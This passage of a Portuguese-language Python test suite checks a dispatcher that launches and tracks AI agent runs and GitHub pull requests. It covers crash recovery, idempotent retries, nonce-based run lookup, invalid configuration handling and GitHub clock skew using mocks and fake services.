                    self.publicar(plano(raia("a", plano_seeds="pl-00b2")))
                    contador = {"n": 0}

                    def gravar(caminho, dados, _k=k, _modo=modo):
                        if pathlib.Path(caminho).name == "estado.json":
                            contador["n"] += 1
                            if contador["n"] == _k:
                                if _modo == "antes":
                                    raise Morte()
                                original(caminho, dados)
                                raise Morte()
                        return original(caminho, dados)

                    morreu = False
                    with mock.patch.object(despachante, "gravar_json_atomico", gravar):
                        try:
                            d.ciclo()
                        except Morte:
                            morreu = True
                    if not morreu:
                        break  # o ciclo tem menos de k gravações
                    d2 = self.novo()
                    for _ in range(8):
                        self.instante += datetime.timedelta(minutes=2)  # F6: um incerto da queda só sai depois do piso
                        rid = self.estado()["orquestrador"].get("runId")
                        if rid and self.motor._runs.get(rid, {}).get("estado") == "running":
                            self.motor.definir_run(rid, estado="succeeded", prUrl=None)
                        d2.ciclo()
                    despachados = [p["plano_seeds"] for p in self.planos_despachados()]
                    self.assertEqual(despachados.count("pl-00b2"), 1)
                    self.assertFalse(self.forja._prs[PR]["aberto"], "PR da tentativa antiga ficou aberto")
                    self.assertEqual(self.forja.merges, [])
                    self.assertEqual(self.runs(FABLE), [])
                    self.assertEqual(self.estado()["raias"]["a"]["estado"], "executando")

    # ------------------------------------------------ Q5: acordadas.jsonl sem runId repetido
    def test_q5_acordadas_nao_grava_duas_vezes_o_mesmo_run_id(self):
        """c19 G7: queda logo depois de o orquestrador novo ser aceito; a recuperação acha o run pelo nonce."""
        d, rid = self.acordar_por_falha()
        self.motor.definir_run(rid, estado="failed", motivoFalha="agent_crashed")
        original = despachante.gravar_json_atomico

        def gravar(caminho, dados):
            if pathlib.Path(caminho).name == "estado.json" and dados.get("acaoEmCurso") is None:
                if (dados.get("orquestrador") or {}).get("runId") not in (None, rid):
                    raise Morte()
            return original(caminho, dados)

        with mock.patch.object(despachante, "gravar_json_atomico", gravar):
            with self.assertRaises(Morte):
                d.ciclo()
        self.assertTrue(self.estado().get("acaoEmCurso"))
        d2 = self.novo()
        for _ in range(4):
            d2.ciclo()
        linhas = self.acordadas()
        ids = [linha["runId"] for linha in linhas]
        self.assertEqual(len(ids), len(set(ids)))
        self.assertEqual([linha["motivo"] for linha in linhas], ["raia_falhou", "raia_falhou"])
        novo = self.estado()["orquestrador"]["runId"]
        self.assertEqual(ids.count(novo), 1)
        self.assertEqual(len(self.runs(FABLE)), 2)

    # ------------------------------------------------ Q6: config.json ilegível no rodar
    def test_q6_config_json_ilegivel_no_rodar_abre_decisao_e_sai_com_2(self):
        """c31 v2c: JSON quebrado (e arquivo ausente) é ConfigInvalida: decisão best-effort e saída 2."""
        self.publicar(plano(raia("a")))
        self.novo().iniciar()
        (self.repo_dir / ".fabrica").mkdir()
        caminho = self.repo_dir / ".fabrica" / "config.json"
        caminho.write_text('{"modelos": ', encoding="utf-8")
        (self.tmp / "tw").write_text(TOKEN, encoding="utf-8")
        (self.tmp / "tg").write_text(TOKEN_GH, encoding="utf-8")
        ambiente = {
            "FABRICA_RAIZ": str(self.raiz),
            "FABRICA_REPO_DIR": str(self.repo_dir),
            "FABRICA_PROJETO": PROJETO,
            "FABRICA_REPO": REPO,
            "WARREN_TOKEN_FILE": str(self.tmp / "tw"),
            "GH_TOKEN_FILE": str(self.tmp / "tg"),
        }

        def rodar():
            erro = io.StringIO()
            codigo = despachante.main(
                ["rodar"], ambiente=ambiente, construir=despachante.construir, saida=io.StringIO(), erro=erro, abrir_forja=lambda amb: self.forja
            )
            return codigo, erro.getvalue()

        codigos = [rodar() for _ in range(2)]
        self.assertEqual([c for c, _ in codigos], [2, 2])
        self.assertIn("config inválida: config.json ilegível (JSONDecodeError)", codigos[0][1])
        self.assertNotIn(str(caminho), codigos[0][1])
        titulo = "[fábrica] config inválida: config.json ilegível (JSONDecodeError)"
        self.assertEqual(self._titulos(), [titulo])
        decisoes = self.estado()["decisoes"]
        self.assertEqual([(x["tipo"], x["alvo"]) for x in decisoes], [("config", "config:config.json ilegível (JSONDecodeError)")])
        caminho.unlink()
        codigo, erro = rodar()
        self.assertEqual(codigo, 2)
        self.assertIn("config.json ilegível (FileNotFoundError)", erro)
        self.assertEqual(len(self._titulos()), 2)
        # `iniciar` com a config ilegível sai com 2 sem abrir decisão (a decisão é do `rodar`)
        erro = io.StringIO()
        codigo = despachante.main(["iniciar"], ambiente=ambiente, construir=despachante.construir, saida=io.StringIO(), erro=erro)
        self.assertEqual(codigo, 2)
        self.assertIn("config.json ilegível", erro.getvalue())
        self.assertEqual(len(self._titulos()), 2)
        # com a config válida de volta, o despachante fecha as issues de config no primeiro ciclo
        caminho.write_text(json.dumps(CONFIG), encoding="utf-8")
        d = self.novo()
        d.ciclo()
        self.assertTrue(all(info["fechada"] for info in self.forja._decisoes.values()))
        self.assertEqual(self.estado()["decisoes"], [])


class TestesCompactar(unittest.TestCase):
    def test_compactar_resume_sem_saidas_longas(self):
        estado_ = est.novo_estado(plano(raia("a"), raia("b")), projeto=PROJETO, repo=REPO)
        estado_["raias"]["a"].update(estado="falhou", retomadas=2, falha="child_pr_merge_timeout")
        estado_["seeds"] = {
            "s-1": dict(est._seed_nova("a"), estado="mergeada", pr=PR),
            "s-2": dict(est._seed_nova("a"), estado="bloqueada_humano", pr=PR, motivoHumano="toca protegidos"),
            "s-3": dict(est._seed_nova("b"), estado="em_revisao", pr=PR, verificacao={"saida": "x" * 9000}),
        }
        estado_["avisos"] = [f"aviso {i}" for i in range(25)]
        estado_["pausado"] = "cota"
        c = despachante.compactar(estado_, plano(raia("a"), raia("b")))
        self.assertEqual(c["faseAtual"], "f1")
        self.assertEqual(c["pausado"], "cota")
        self.assertEqual(c["raias"]["a"], {"estado": "falhou", "retomadas": 2, "falha": "child_pr_merge_timeout"})
        self.assertEqual(set(c["seeds"]), {"s-2", "s-3"})
        self.assertEqual(c["seeds"]["s-2"], {"estado": "bloqueada_humano", "pr": PR, "motivos": ["toca protegidos"]})
        self.assertEqual(c["avisos"], [f"aviso {i}" for i in range(15, 25)])
        self.assertLess(len(json.dumps(c)), 2000)

    def test_compactar_nao_muta_a_entrada(self):
        estado_ = est.novo_estado(plano(raia("a")), projeto=PROJETO, repo=REPO)
        antes = copy.deepcopy(estado_)
        despachante.compactar(estado_, plano(raia("a")))
        self.assertEqual(estado_, antes)


class TestesRodada5(Base):
    """Rodada 5: R1 (resposta não solta o incerto), R2 (retry do Warren por infra perdida), R3 (cadeia de nonces e
    atraso de visibilidade), R4 (relógio do GitHub contra ele mesmo) e R5 (teto de páginas é busca falha)."""

    UTC = datetime.timezone.utc
    TITULO_INCERTO = "[fábrica] despacho não confirmado: "

    def _relogio(self):
        """Um relógio só: o despachante, o Warren falso (janela de idempotência, startedAt) e o GitHub falso."""
        self.instante = datetime.datetime(2026, 11, 3, 12, 0, 0, tzinfo=self.UTC)
        self.motor.agora = lambda: self.instante
        self.forja.agora = lambda: self.instante

    def _avancar(self, segundos=30):
        self.instante += datetime.timedelta(seconds=segundos)

    def _titulos(self):
        return [t for t, _ in self.forja.decisoes]

    def _runs_criados(self):
        """Os runs que o Warren falso criou de fato (pagos), inclusive os retries dele; sem filhos de Plan Run."""
        return [r for r in self.motor._momentos if r.startswith("run-")]

    def _incerto_com_busca_falha(self, acao):
        self.motor = MotorTimeoutDepoisDeAceitar("despachar_run", 1)
        self._relogio()

        def falha(projeto, nonce, desde=None):
            raise RuntimeError("GET /runs?project=x: HTTP 500")

        self.motor.procurar_run = falha
        d = self.preparar_raia()
        if acao == "revisar":
            self.abrir_pr(H1)
            chave = "revisar:s-1"
        else:
            self.motor.definir_plano("plano-1", "failed", [], falha="cancelado")
            chave = "acordar:raia_falhou:a"
        d.ciclo()
        self.assertEqual([i["chave"] for i in self.estado()["despachosIncertos"]], [chave])
        return d, chave

    def _ate_o_run(self, papel):
        """Um run pago de `papel` em curso (revisor, fixer ou orquestrador): devolve (despachante, campo, run_id)."""
        d = self.preparar_raia()
        if papel == "orquestrador":
            self.motor.definir_plano("plano-1", "failed", [], falha="cancelado")
            d.ciclo()
            return d, "orquestrador", self.estado()["orquestrador"]["runId"]
        self.abrir_pr(H1, ci="vermelho" if papel == "fixer" else "verde")
        d.ciclo()
        if papel == "revisor":
            return d, "revisaoRunId", self.estado()["seeds"]["s-1"]["revisaoRunId"]
        self.terminar_revisao(H1)
        d.ciclo()
        return d, "fixerRunId", self.estado()["seeds"]["s-1"]["fixerRunId"]

    def _run_de(self, campo):
        if campo == "orquestrador":
            return self.estado()["orquestrador"]["runId"]
        return self.estado()["seeds"]["s-1"][campo]

    # ------------------------------------------------ R1: a resposta do Paulo não solta o item
    def test_r1_resposta_fora_da_janela_com_a_busca_de_volta_nao_duplica(self):
        """c33 R2 e c35 R3: 10 buscas falhas, decisão, resposta 15 min depois (janela de idempotência vencida) e a busca
        volta: o run é achado pelo nonce e adotado; um run pago só."""
        for acao in ("revisar", "acordar"):
            with self.subTest(acao=acao):
                self.setUp()
                d, chave = self._incerto_com_busca_falha(acao)
                for _ in range(10):
                    self._avancar()
                    d.ciclo()
                self.assertIn(self.TITULO_INCERTO + chave, self._titulos())
                self.motor._idempotencia.clear()  # restart do Warren: a janela de 10 min se perde
                url = [x for x in self.estado()["decisoes"] if x.get("tipo") == "incerto"][0]["url"]
                self._avancar(15 * 60)
                self.forja.definir_decisao(url, fechada=True, ultimo_comentario="O run existe no Warren; não refaça.")
                self._avancar()
                d.ciclo()
                e = self.estado()
                self.assertEqual([(i["chave"], i["ciclos"]) for i in e["despachosIncertos"]], [(chave, 0)])
                posts = len(self.runs(OPUS if acao == "revisar" else FABLE))
                self.assertEqual(posts, 1)  # o POST incerto: nenhum redespacho na resposta
                del self.motor.procurar_run  # a busca volta
                for _ in range(4):
                    self._avancar()
                    d.ciclo()
                e = self.estado()
                self.assertEqual(e["despachosIncertos"], [])
                self.assertEqual(len(self.runs(OPUS if acao == "revisar" else FABLE)), 1)
                # criados no Warren: o run incerto e, no caso da revisão, o orquestrador acordado pela resposta
                self.assertEqual(len(self._runs_criados()), 2 if acao == "revisar" else 1)
                rid = self._runs_criados()[0]
                self.assertEqual(self._run_de("revisaoRunId" if acao == "revisar" else "orquestrador"), rid)
                self.assertEqual(self._titulos().count(self.TITULO_INCERTO + chave), 1)
                self.assertTrue(self.forja._decisoes[url]["fechada"])
                self.assertIsNone(e["pausado"])
                respostas = [p for p in e["acordarPendentes"] if p["motivo"] == "resposta_paulo"]
                if acao == "acordar":
                    self.assertEqual(len(respostas), 1)  # espera o orquestrador adotado terminar
                else:
                    self.assertEqual(respostas, [])
                    (orq,) = self.runs(FABLE)
                    self.assertIn("O run existe no Warren; não refaça.", orq["prompt"])

    def test_r1_resposta_com_a_busca_ainda_quebrada_segura_o_item_e_escala_de_novo(self):
        """c33 R2b: depois da resposta a busca segue falhando: nenhum redespacho; uma nova decisão na 10ª falha seguinte."""
        d, chave = self._incerto_com_busca_falha("revisar")
        for _ in range(10):
            self._avancar()
            d.ciclo()
        url = [x for x in self.estado()["decisoes"] if x.get("tipo") == "incerto"][0]["url"]
        self._avancar(15 * 60)
        self.forja.definir_decisao(url, fechada=True, ultimo_comentario="O run existe; não refaça.")
        for k in range(9):
            self._avancar()
            d.ciclo()
            e = self.estado()
            self.assertEqual([(i["chave"], i["falhasBusca"]) for i in e["despachosIncertos"]], [(chave, k + 1)])
            self.assertEqual(self._titulos().count(self.TITULO_INCERTO + chave), 1)
        self._avancar()
        d.ciclo()
        self.assertEqual(self._titulos().count(self.TITULO_INCERTO + chave), 2)
        self.assertEqual(len(self.runs(OPUS)), 1)  # nenhum redespacho da revisão
        self.assertEqual(len(self._runs_criados()), 2)  # a revisão incerta e o orquestrador acordado pela resposta
        self.assertEqual(len(self.runs(FABLE)), 1)
        self.assertIsNone(self.estado()["pausado"])
        self.assertIn(chave, self.estado()["noncesRaiz"])

    # ------------------------------------------------ R2: retry automático do Warren por infra perdida
    def test_r2_retry_do_warren_e_adotado_como_continuacao(self):
        """c34 I1 e I2: o run falha `sandbox_run_lost`/`preempted`, o Warren recria; o despachante adota o retry."""
        for papel in ("revisor", "fixer", "orquestrador"):
            for motivo in ("sandbox_run_lost", "preempted"):
                with self.subTest(papel=papel, motivo=motivo):
                    self.setUp()
                    self._relogio()
                    d, campo, original = self._ate_o_run(papel)
                    posts, antes = len(self.runs()), set(self._runs_criados())
                    self.motor.definir_run(original, estado="failed", motivoFalha=motivo)
                    retry = self.motor.retry_de(original)
                    self.assertIsNotNone(retry)
                    self._avancar()
                    d.ciclo()
                    e = self.estado()
                    self.assertEqual(self._run_de(campo), retry)
                    self.assertEqual(len(self.runs()), posts)  # nenhum POST pago a mais
                    self.assertEqual(set(self._runs_criados()) - antes, {retry})
                    self.assertNotIn(original, e.get("retriesEsperados") or {})
                    adocoes = [x for x in self.log() if x.get("evento") == "retry_adotado"]
                    self.assertEqual([(x["original"], x["runId"], x["papel"]) for x in adocoes], [(original, retry, papel)])
                    if papel == "orquestrador":
                        self.assertEqual(e["falhasAcordar"], 0)
                        self.assertEqual(e["acordarPendentes"], [])
                        self.assertIsNone(e["orquestrador"].get("contadoRunId"))
                        self.assertEqual(e["orquestrador"]["acordada"]["motivo"], "raia_falhou")
                    else:
                        self.assertEqual(e["seeds"]["s-1"]["estado"], "em_revisao" if papel == "revisor" else "corrigindo")
                        self.assertEqual(self.acordadas(), [])
                    # o retry termina bem e a jornada segue
                    if papel == "revisor":
                        self.motor.definir_run(retry, estado="succeeded")
                        self.motor.definir_texto(retry, veredito_texto(H1))
                        d.ciclo()
                        self.assertEqual(self.estado()["seeds"]["s-1"]["veredito"]["sha"], H1)
                        self.assertEqual(self.forja.merges, [(PR, H1)])
                    elif papel == "fixer":
                        self.motor.definir_run(retry, estado="succeeded")
                        self.mover_head(H2, ci="verde")
                        acoes = d.ciclo()
                        self.assertEqual([(a["tipo"], a["sha"]) for a in acoes], [("revisar", H2), ("verificar", H2)])
                        self.assertEqual(len(self.runs(HAIKU)), 1)
                    else:
                        self.pr_do_orquestrador(retry, [".fabrica/plano.json"], plano(raia("a")))
                        d.ciclo()
                        self.assertEqual(self.forja.merges, [(PR_ORQ, H3)])
                        self.assertEqual(self.estado()["orquestrador"]["semResultadoSeguidos"], 0)
                        self.assertEqual(len(self.runs(FABLE)), 1)

    def test_r2_retry_que_tambem_se_perde_nao_espera_e_segue_o_caminho_de_hoje(self):
        """Um retry não ganha outro retry no Warren (is_retry): o despachante não procura por 3 ciclos."""
        self._relogio()
        d, campo, original = self._ate_o_run("revisor")
        self.motor.definir_run(original, estado="failed", motivoFalha="sandbox_run_lost")
        retry = self.motor.retry_de(original)
        self._avancar()
        d.ciclo()
        self.assertEqual(self._run_de(campo), retry)
        self.motor.definir_run(retry, estado="failed", motivoFalha="sandbox_run_lost")
        self.assertIsNone(self.motor.retry_de(retry))
        self._avancar()
        d.ciclo()
        self.assertEqual(len(self.runs(OPUS)), 2)  # revisão refeita no mesmo ciclo (caminho de hoje)
        self.assertNotIn(retry, self.estado().get("retriesEsperados") or {})

    def test_r2_sem_retry_em_3_leituras_boas_segue_o_caminho_de_hoje(self):
        """Orçamento esgotado ou cancelamento: o Warren não recria; depois de 3 buscas boas sem achar, o caminho de hoje."""
        for papel in ("revisor", "orquestrador"):
            with self.subTest(papel=papel):
                self.setUp()
                self._relogio()
                self.motor.retry_infra_perdida = False
                d, campo, original = self._ate_o_run(papel)
                posts = len(self.runs())
                self.motor.definir_run(original, estado="failed", motivoFalha="sandbox_run_lost")
                for k in (1, 2):
                    self._avancar(150)  # F6: 3 buscas de 2,5 min passam o piso de 5 min
                    d.ciclo()
                    e = self.estado()
                    self.assertEqual(self._run_de(campo), original)  # ainda esperando o retry
                    self.assertEqual(len(self.runs()), posts)
                    self.assertEqual(e["retriesEsperados"][original]["buscas"], k)
                    self.assertEqual(e["retriesEsperados"][original]["papel"], papel)
                self._avancar(150)
                d.ciclo()
                e = self.estado()
                self.assertNotIn(original, e.get("retriesEsperados") or {})
                self.assertEqual(len(self.runs()), posts + 1)  # caminho de hoje: redespacho
                if papel == "orquestrador":
                    self.assertEqual(e["falhasAcordar"], 1)
                    self.assertNotEqual(self._run_de(campo), original)
                else:
                    self.assertNotEqual(self._run_de(campo), original)
                    self.assertEqual(e["seeds"]["s-1"]["estado"], "em_revisao")
                buscas = [a for n, a in self.motor.chamadas if n == "procurar_retry"]
                self.assertEqual(len(buscas), 3)
                self.assertEqual(buscas[0]["run_id"], original)
                self.assertEqual(len(buscas[0]["nonces"]), 1)  # o nonce do despacho, guardado por run
                self.assertTrue(buscas[0]["desde"])

    def test_r2_busca_do_retry_que_falha_nao_conta_como_leitura_boa_e_escala_na_10a(self):
        """A busca pelo retry que falha (HTTP 500 ou teto de páginas) não gasta os 3 ciclos; na 10ª abre decisão."""
        self._relogio()
        d, campo, original = self._ate_o_run("revisor")
        self.motor.definir_run(original, estado="failed", motivoFalha="sandbox_run_lost")
        retry = self.motor.retry_de(original)
        boa = self.motor.procurar_retry

        def falha(projeto, run_id, nonces, desde=None):
            self.motor._registrar("procurar_retry", projeto=projeto, run_id=run_id, nonces=nonces, desde=desde)
            raise RuntimeError("GET /runs?project=x: HTTP 500")

        self.motor.procurar_retry = falha
        titulo = self.TITULO_INCERTO + "retry:" + original
        for k in range(9):
            self._avancar()
            d.ciclo()
            e = self.estado()
            self.assertEqual(self._run_de(campo), original)
            self.assertEqual(e["retriesEsperados"][original]["buscas"], 0)
            self.assertEqual(e["retriesEsperados"][original]["falhasBusca"], k + 1)
            self.assertNotIn(titulo, self._titulos())
        self._avancar()
        d.ciclo()
        self.assertIn(titulo, self._titulos())
        self.assertEqual(len(self.runs(OPUS)), 1)
        # R1 vale também aqui: a resposta do Paulo acorda o orquestrador, zera as falhas e NÃO redespacha
        url = [x for x in self.estado()["decisoes"] if x.get("tipo") == "incerto"][0]["url"]
        self.forja.definir_decisao(url, fechada=True, ultimo_comentario="o retry existe, espere")
        for k in range(10):
            # a busca do retry corre antes das decisões no ciclo: no ciclo da resposta ela falha e depois é zerada
            self._avancar()
            d.ciclo()
            e = self.estado()
            self.assertEqual(e["retriesEsperados"][original]["falhasBusca"], k)
            self.assertEqual(self._titulos().count(titulo), 1)
        self._avancar()
        d.ciclo()
        self.assertEqual(self._titulos().count(titulo), 2)
        self.assertEqual(self._run_de(campo), original)
        self.assertEqual(len(self.runs(OPUS)), 1)
        self.assertIn("o retry existe, espere", self.runs(FABLE)[0]["prompt"])
        self.motor.procurar_retry = boa  # a busca volta e acha o retry
        self._avancar()
        d.ciclo()
        e = self.estado()
        self.assertEqual(self._run_de(campo), retry)
        self.assertEqual(len(self.runs(OPUS)), 1)
        self.assertFalse([x for x in e["decisoes"] if x.get("tipo") == "incerto"])
        d.ciclo()
        self.assertTrue(all(i["fechada"] for i in self.forja._decisoes.values()))

    # ------------------------------------------------ R3: cadeia de nonces e atraso de visibilidade
    def test_r3_run_invisivel_por_4_ciclos_com_toda_resposta_perdida_paga_um_run_so(self):
        """c33 CH e c37 CH2 (20, 40 e 60 min): o Warren cria o run mas só o lista 4 ciclos depois (refreshProject antes do
        insert) e toda resposta de POST se perde; a chave devolve o run da 1ª tentativa, cujo nonce é o 1º da cadeia."""
        for minutos in (20, 40, 60):
            with self.subTest(minutos=minutos):
                self.setUp()
                self.motor = MotorTimeoutDepoisDeAceitar("despachar_run", 10**6)
                self._relogio()
                # F6: com o piso de 5 min, um atraso de 120 s já não gera 2º POST; 7 min ainda exercita a cadeia
                self.motor.atraso_de_visibilidade = datetime.timedelta(seconds=420)
                self.motor.iniciar_historico(60, projeto=PROJETO, ha=datetime.timedelta(hours=1))
                d = self.preparar_raia()
                self.abrir_pr(H1)
                for _ in range(minutos * 2):
                    self._avancar()
                    d.ciclo()
                e = self.estado()
                self.assertEqual(len(self._runs_criados()), 1)
                (rid,) = self._runs_criados()
                self.assertEqual(e["seeds"]["s-1"]["revisaoRunId"], rid)
                self.assertEqual(e["despachosIncertos"], [])
                self.assertIsNone(e["pausado"])
                self.assertEqual(self._titulos(), [])
                self.assertNotIn("revisar:s-1", e.get("noncesRaiz") or {})
                self.assertNotIn("revisar:s-1", e.get("cadeias") or {})
                achados = [x for x in self.log() if x.get("evento") == "despacho_incerto_achado"]
                self.assertEqual(len(achados), 1)
                # o item incerto levava a cadeia inteira, e a busca casou o nonce da 1ª tentativa (o do prompt do run)
                buscas = [a for n, a in self.motor.chamadas if n == "procurar_run"]
                self.assertGreaterEqual(len(buscas[-1]["nonce"]), 2)
                primeiro = buscas[0]["nonce"][0] if isinstance(buscas[0]["nonce"], list) else buscas[0]["nonce"]
                self.assertIn(motor.MARCADOR_NONCE % primeiro, self.motor._textos_enviados[rid][1])
                self.assertEqual(buscas[-1]["nonce"][0], primeiro)

    def test_r3_o_item_incerto_guarda_todos_os_nonces_da_cadeia(self):
        self.motor = MotorTimeoutDepoisDeAceitar("despachar_run", 10**6, criar=False)
        self._relogio()
        d = self.preparar_raia()
        self.abrir_pr(H1)
        nonces = []
        for _ in range(8):
            self._avancar(150)  # F6: 3 buscas de 2,5 min passam o piso de 5 min
            d.ciclo()
            for item in self.estado()["despachosIncertos"]:
                self.assertEqual(item["nonces"][-1], item["nonce"])
                self.assertEqual(item["nonces"][0], self.estado()["noncesRaiz"]["revisar:s-1"])
                nonces = item["nonces"]
        # 8 ciclos: 1º POST (c1); 3 buscas, descarte e 2º POST (c4); 3 buscas, descarte e 3º POST (c7); 1 busca (c8)
        self.assertEqual(len(nonces), 3)
        self.assertEqual(len(set(nonces)), 3)
        self.assertEqual(len(self.runs(OPUS)), 3)
        self.assertEqual(self.estado()["cadeias"]["revisar:s-1"]["nonces"], nonces)

    # ------------------------------------------------ R4: o relógio do GitHub contra ele mesmo
    def _decisao_de_seed(self):
        d = self.preparar_raia()
        self.abrir_pr(H1, arquivos=("src/auth/x.ts",))
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        url = self.estado()["decisoes"][-1]["url"]
        self.assertEqual(self.estado()["seeds"]["s-1"]["estado"], "bloqueada_humano")
        return d, url

    def _reaberturas(self):
        return [a for n, a in self.forja.chamadas if n == "reabrir_decisao"]

    def _fechar_sem_comentario(self, url):
        atual = self.forja._decisoes[url]
        self._avancar(60)
        self.forja.definir_decisao(url, fechada=True, ultimo_comentario=atual.get("ultimoComentario", ""))

    def test_r4_relogio_do_github_adiantado_nao_perde_a_escalada(self):
        """c36 Q3b: GitHub 120 s (e 1 h) à frente do nosso relógio, leituras velhas com o mesmo closed_at depois da
        reabertura: um comentário só, a decisão continua acompanhada e o orquestrador não é acordado."""
        for adianto in (0, 120, 3600):
            with self.subTest(adianto=adianto):
                self.setUp()
                self._relogio()
                self.forja.agora = lambda: self.instante + datetime.timedelta(seconds=adianto)
                d, url = self._decisao_de_seed()
                self._fechar_sem_comentario(url)
                velha = dict(self.forja._decisoes[url])
                self._avancar(60)
                d.ciclo()
                self.assertEqual(len(self._reaberturas()), 1)
                decisao = [x for x in self.estado()["decisoes"] if x["url"] == url][0]
                self.assertEqual(decisao["fechadaEmVista"], velha["fechadaEm"])
                original = self.forja.decisao
                atraso = {"n": 3}

                def decisao_atrasada(u, _o=original):
                    if u == url and atraso["n"] > 0:
                        atraso["n"] -= 1
                        return dict(velha)
                    return _o(u)

                self.forja.decisao = decisao_atrasada
                for _ in range(4):
                    self._avancar(60)
                    d.ciclo()
                e = self.estado()
                self.assertEqual(len(self._reaberturas()), 1)
                self.assertIn(url, [x["url"] for x in e["decisoes"]])
                self.assertEqual(self.runs(FABLE), [])
                self.assertFalse(self.forja._decisoes[url]["fechada"])
                # um fechamento novo de verdade (closed_at posterior ao visto) ainda é reconhecido
                self._fechar_sem_comentario(url)
                self._avancar(60)
                d.ciclo()
                self.assertEqual(len(self._reaberturas()), 2)
                self.assertIn(url, [x["url"] for x in self.estado()["decisoes"]])

    def test_r4_sem_closed_at_visto_vale_a_hora_da_reabertura(self):
        """`reabertaEm` fica só como fallback, quando a reabertura não viu closed_at."""
        self._relogio()
        self.forja.agora = lambda: self.instante + datetime.timedelta(seconds=120)
        d, url = self._decisao_de_seed()
        original = self.forja.decisao
        self.forja.definir_decisao(url, fechada=True)
        self.forja.decisao = lambda u: {"fechada": True, "ultimoComentario": ""}
        self._avancar(60)
        d.ciclo()
        self.forja.decisao = original
        decisao = [x for x in self.estado()["decisoes"] if x["url"] == url][0]
        self.assertIsNone(decisao["fechadaEmVista"])
        self.assertEqual(len(self._reaberturas()), 1)
        self._fechar_sem_comentario(url)  # closed_at (GitHub adiantado) posterior à reabertura: fechamento novo
        self._avancar(60)
        d.ciclo()
        self.assertEqual(len(self._reaberturas()), 2)
        # leitura velha com o nosso relógio atrás do GitHub e sem closed_at visto: só o fallback decide
        self.assertEqual(despachante.Despachante._leitura_velha({"reabertaEm": "2026-11-03T12:10:00Z"}, "2026-11-03T12:09:00Z", ""), True)
        self.assertEqual(despachante.Despachante._leitura_velha({"reabertaEm": "2026-11-03T12:10:00Z"}, "2026-11-03T12:11:00Z", ""), False)
        # com closed_at visto, só ele conta: nem um reabertaEm posterior ao closed_at torna a leitura nova
        vista = {"reabertaEm": "2026-11-03T12:10:00Z", "fechadaEmVista": "2026-11-03T12:12:00Z"}
        self.assertEqual(despachante.Despachante._leitura_velha(vista, "2026-11-03T12:12:00Z", ""), True)
        self.assertEqual(despachante.Despachante._leitura_velha(vista, "2026-11-03T12:11:00Z", ""), True)
        self.assertEqual(despachante.Despachante._leitura_velha(vista, "2026-11-03T12:12:01Z", ""), False)

    # ------------------------------------------------ R5: o teto de páginas é busca falha
    def test_r5_busca_no_teto_de_paginas_e_falha_e_nunca_redespacha(self):
        """c33 Q2: 2.100 runs alheios na fila (NULL) na frente do nosso, que fica na fila 30 ciclos, e restart do Warren:
        a busca bate no teto de 20 páginas; isso conta como busca falha (decisão na 10ª), nunca como "não encontrado"."""
        self.motor = MotorTimeoutDepoisDeAceitar("despachar_run", 0)
        self._relogio()
        self.motor.iniciar_historico(60, projeto=PROJETO, ha=datetime.timedelta(hours=1))
        self.motor.iniciar_historico(2100, projeto=PROJETO, na_fila=True)  # na fila (NULL), na frente do nosso no id ASC
        self.motor.enfileirar(True)
        self.motor.vezes = 1
        d = self.preparar_raia()
        self.abrir_pr(H1)
        self._avancar()
        d.ciclo()  # o POST fica incerto; o run entra na fila atrás dos 2.100
        (rid,) = self._runs_criados()
        self.motor._idempotencia.clear()  # restart do Warren
        titulo = self.TITULO_INCERTO + "revisar:s-1"
        for k in range(9):
            self._avancar()
            d.ciclo()
            e = self.estado()
            self.assertEqual([(i["chave"], i["ciclos"], i["falhasBusca"]) for i in e["despachosIncertos"]], [("revisar:s-1", 0, k + 1)])
            self.assertNotIn(titulo, self._titulos())
        self._avancar()
        d.ciclo()
        self.assertIn(titulo, self._titulos())
        for _ in range(20):
            self._avancar()
            d.ciclo()
        e = self.estado()
        self.assertEqual([(i["chave"], i["ciclos"]) for i in e["despachosIncertos"]], [("revisar:s-1", 0)])
        self.assertEqual(len(self.runs(OPUS)), 1)
        self.assertIsNone(e["pausado"])
        self.assertNotIn(despachante.TITULO_WARREN, self._titulos())  # as leituras dos planos seguem boas
        erros = [x for x in self.log() if x.get("etapa") == "procurar_despacho"]
        self.assertTrue(erros and all("BuscaIncompleta" in (x.get("erro") or "") for x in erros))
        self.motor.iniciar_run(rid)  # o run sai da fila: a busca DESC o acha
        self._avancar()
        d.ciclo()
        e = self.estado()
        self.assertEqual(e["despachosIncertos"], [])
        self.assertEqual(e["seeds"]["s-1"]["revisaoRunId"], rid)
        self.assertEqual(len(self.runs(OPUS)), 1)
        self.assertEqual(self._titulos().count(titulo), 1)


# ---------------------------------------------------------------- correção final (F1–F14)


def _plano_de_duas_fases(fase="f1", ordem=("f1", "f2")):
    fases = {"f1": {"id": "f1", "raias": ["a"]}, "f2": {"id": "f2", "raias": ["b"]}}
    return {
        "versao": 1,
        "faseAtual": fase,
        "fases": [fases[f] for f in ordem],
        "raias": [raia("a"), raia("b", plano_seeds="pl-000b")],
    }


class TestesCorrecaoFinal(Base):
    UTC = datetime.timezone.utc
    _relogio = TestesRodada5._relogio
    _avancar = TestesRodada5._avancar
    _runs_criados = TestesRodada5._runs_criados
    _ate_o_run = TestesRodada5._ate_o_run
    _run_de = TestesRodada5._run_de

    def _titulos(self):
        return [t for t, _ in self.forja.decisoes]

    def _passar(self, minutos=0, segundos=0):
        self.instante += datetime.timedelta(minutes=minutos, seconds=segundos)

    def _verificacao_fixa(self, codigo, saida="", **extra):
        def verificar(repo_dir, sha, comando, *, conteiner):
            self.verificacoes.append((repo_dir, sha, comando, conteiner))
            return dict({"sha": sha, "codigo": codigo, "saida": saida}, **extra)

        self.verificar_falso = verificar

    # ------------------------------------------------ F1: CI "ausente" transitório
    def test_f1_ci_ausente_logo_depois_do_pr_e_verde_em_seguida_mergeia_sem_issue_nem_orquestrador(self):
        """probe_a2: CI "ausente" no primeiro ciclo depois do PR e verde no seguinte."""
        d = self.preparar_raia()
        self.abrir_pr(H1, ci="ausente")
        acoes = d.ciclo()
        self.assertEqual([a["tipo"] for a in acoes], ["revisar", "verificar"])
        self.assertEqual(self.estado()["seeds"]["s-1"]["headVistoEm"], self.instante.isoformat())
        self.forja.definir_ci(REPO, H1, "verde")
        self.terminar_revisao(H1)
        self._passar(segundos=30)
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR, H1)])
        self.assertEqual(self.forja.decisoes, [])
        self.assertEqual(self.runs(FABLE), [])
        self.assertEqual(self.estado()["acordarPendentes"], [])

    def test_f1_ci_ausente_por_10_min_vai_para_o_humano(self):
        d = self.preparar_raia()
        self.abrir_pr(H1, ci="ausente")
        d.ciclo()
        self.terminar_revisao(H1)
